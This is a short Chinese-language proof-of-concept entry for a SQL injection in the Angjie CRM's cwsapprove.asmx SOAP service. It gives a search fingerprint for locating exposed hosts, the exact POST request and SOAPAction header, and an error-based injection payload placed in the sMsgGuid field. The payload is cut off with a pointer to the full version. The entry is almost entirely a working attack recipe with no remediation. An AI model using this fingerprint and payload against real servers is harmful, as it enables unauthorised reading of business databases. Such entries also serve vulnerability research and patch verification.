# 昂捷CRMcwsapprove存在SQL注入漏洞

- **系统**：昂捷　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/Scripts/EnjoyMsg.js"`
- **请求**：`POST /EnjoyRMIS_WS/WS/Approve/cwsapprove.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/EndBillApprove1"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<EndBillApprove1 xmlns="http://tempuri.org/">
<sMsgGuid>' AND 9173 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9173=9173) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113))) AND 'rhYc'='rhYc</sMsgGuid>
<sUserno>string</sUserno>
<sEformDataIp>string</sEformDataIp>
</EndBillApprove1>
</soap:Body>
</soap:Enve…（脚本共 605 字，完整版见原文）
```
- **预期**：500　|　—